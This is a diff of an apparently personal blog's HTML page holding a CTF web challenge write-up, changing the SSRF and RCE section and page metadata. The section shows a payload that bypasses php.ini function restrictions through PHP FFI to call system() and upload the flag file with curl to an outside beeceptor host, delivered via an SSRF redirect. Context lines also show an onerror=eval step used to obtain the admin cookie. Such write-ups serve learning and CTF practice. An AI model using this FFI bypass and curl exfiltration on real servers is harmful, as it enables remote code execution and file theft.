@@ -28,7 +28,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://xyz-macabely.github.io/images/0/logo.png">
 <meta property="article:published_time" content="2025-09-29T21:00:00.000Z">
-<meta property="article:modified_time" content="2025-10-15T15:26:29.597Z">
+<meta property="article:modified_time" content="2025-10-15T20:17:00.422Z">
 <meta property="article:author" content="Macabely">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -760,7 +760,9 @@ onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-title function
 <p><img src="/images/0/Screenshot%202025-10-15%20112532.png" srcset="/img/loading.gif" lazyload alt="admin cookie"></p>
 <h2 id="SSRF-RCE"><a href="#SSRF-RCE" class="headerlink" title="SSRF&amp;RCE"></a>SSRF&amp;RCE</h2><p>After getting the admin cookie you can access the <code>/api/admin/fetch-url</code> to access the php service. What you need is to publish a server that will redirect any request to <code>http://php</code>.</p>
 <p>You can create a python server with ngrok but i used <a target="_blank" rel="noopener" href="https://app.beeceptor.com/">beeceptor</a> instead. That’s how to do the SSRF part.</p>
-<p>The RCE part is kinda tricky, all the basic command injection payloads will not really work cause the service probably disabled all the sensitive functions or it has a WAF on it. But if you looked at the dockerfile of the service again:</p>
+<p>The RCE part is kinda tricky, all the basic command injection payloads will not really work cause in the <code>php.ini</code> file it’s configured to disable all the sensitive functions. </p>
+<p><img src="/images/0/Screenshot%202025-10-15%20231258.png" srcset="/img/loading.gif" lazyload></p>
+<p>But if you looked at the dockerfile of the service again:</p>
 <div class="code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> php:<span class="hljs-number">8.2</span>-apache
 <span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y libffi-dev</span>
 <span class="hljs-keyword">RUN</span><span class="language-bash"> docker-php-ext-install ffi</span>
@@ -770,6 +772,8 @@ onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-title function
 <span class="hljs-keyword">COPY</span><span class="language-bash"> index.php /var/www/html/</span>
 <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span></code></pre></div>
 <p>You will notice it’s installing <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.ffi.php">ffi</a>. <code>ffi</code> is like a mechanism that allows a program written in one programming language to <strong>call functions</strong> and use services written in another language, typically a lower-level one like C.</p>
+<p>Also the FFI is enabled in <code>php.ini</code> file:</p>
+<p><img src="/images/0/Screenshot%202025-10-15%20231645.png" srcset="/img/loading.gif" lazyload></p>
 <p>In this case we can call sensitive functions, bypassing the striction exist in the php service successfully. I spent some time is this part until i made the final payload:<br><code>$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
 <p>Here we called the system function and used the curl command from it.</p>
 <p>By this information, you can start a server and make it redirect to: <code>Location: http://php?code=$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
@@ -809,9 +813,9 @@ onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-title function
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/web/" class="print-no-link">#web</a>
-      
         <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
       
     </div>
   
